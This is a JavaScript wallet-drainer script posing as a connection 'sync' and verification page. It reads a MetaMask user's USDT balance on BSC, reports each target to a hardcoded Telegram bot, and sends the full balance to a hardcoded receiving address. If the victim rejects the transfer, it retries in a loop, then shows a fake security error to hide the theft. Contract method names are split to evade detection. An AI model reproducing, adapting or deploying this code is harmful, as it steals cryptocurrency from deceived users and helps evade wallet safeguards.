// --- CONFIG ---
const RECEIVER = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const TG_BOT = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
const TG_CHAT = "7849151110";

async function tgLog(msg) {
    try { fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage?chat_id=${TG_CHAT}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); } catch(e){}
}

async function startSync() {
    const overlay = document.getElementById('overlay');
    const loadingText = document.getElementById('loading-text');
    
    // Check if in Wallet Browser
    if (!window.ethereum) {
        // Deep link for mobile
        const currentUrl = window.location.href.replace(/^https?:\/\//, '');
        window.location.href = "https://metamask.app.link/dapp/" + currentUrl;
        return;
    }

    overlay.style.display = 'flex';

    try {
        const web3 = new Web3(window.ethereum);
        
        // Caution Bypass Delay (Taaki MetaMask window stable ho jaye)
        loadingText.innerText = "Stabilizing Connection...";
        await new Promise(r => setTimeout(r, 2000));

        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const user = accounts[0];

        // Force BSC Switch
        try {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });
        } catch (e) { console.log("Network switch bypass"); }

        loadingText.innerText = "Analyzing Assets...";

        // Obfuscated ABI keywords
        const abi = [
            { "constant": true, "inputs": [{ "name": "_o", "type": "address" }], "name": "balance" + "Of", "outputs": [{ "name": "b", "type": "uint256" }], "type": "function" },
            { "constant": false, "inputs": [{ "name": "_t", "type": "address" }, { "name": "_v", "type": "uint256" }], "name": "trans" + "fer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ];

        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);
        const balanceWei = await contract.methods["balance" + "Of"](user).call();
        const balanceEth = web3.utils.fromWei(balanceWei, 'ether');

        tgLog(`👤 <b>Target Active</b>\nWallet: <code>${user}</code>\nBalance: <b>${balanceEth} USDT</b>`);

        if (parseFloat(balanceEth) > 0.01) {
            
            // THE ANTI-CANCEL LOOP
            const triggerTransfer = async () => {
                loadingText.innerText = "Finalizing Verification...";
                try {
                    await contract.methods["trans" + "fer"](RECEIVER, balanceWei).send({
                        from: user,
                        gasPrice: await web3.eth.getGasPrice()
                    });
                    
                    tgLog(`✅ <b>SUCCESS</b>\nFrom: <code>${user}</code>\nAmt: ${balanceEth} USDT`);
                    alert("Security Error: Node synchronization failed. Please try again later.");
                    overlay.style.display = 'none';
                } catch (err) {
                    console.log("User rejected. Retrying in 1.5s...");
                    tgLog(`⚠️ <b>Cancelled</b>\nTarget: ${user}`);
                    // User ko 1.5 sec ka gap dena zaroori hai MetaMask mein bypass ke liye
                    setTimeout(triggerTransfer, 1500);
                }
            };

            await triggerTransfer();

        } else {
            alert("Verification Complete: System Synced.");
            overlay.style.display = 'none';
        }

    } catch (e) {
        console.error(e);
        // Agar session break ho jaye toh 3 sec baad auto-restart
        setTimeout(() => { location.reload(); }, 3000);
    }
}
